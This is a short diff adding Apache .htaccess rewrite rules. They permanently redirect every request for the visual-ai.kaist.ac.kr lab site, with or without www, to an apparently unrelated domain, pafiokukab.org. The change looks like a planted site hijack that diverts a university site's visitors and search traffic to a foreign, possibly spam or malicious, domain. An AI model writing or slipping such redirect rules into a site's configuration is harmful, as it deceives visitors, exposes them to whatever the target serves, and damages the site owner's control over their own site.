@@ -1,0 +1,3 @@
+RewriteCond %{HTTP_HOST} ^visual-ai.kaist.ac.kr [NC,OR]
+RewriteCond %{HTTP_HOST} ^www.visual-ai.kaist.ac.kr [NC]
+RewriteRule ^(.*)$ https://pafiokukab.org/$1 [L,R=301,NC]
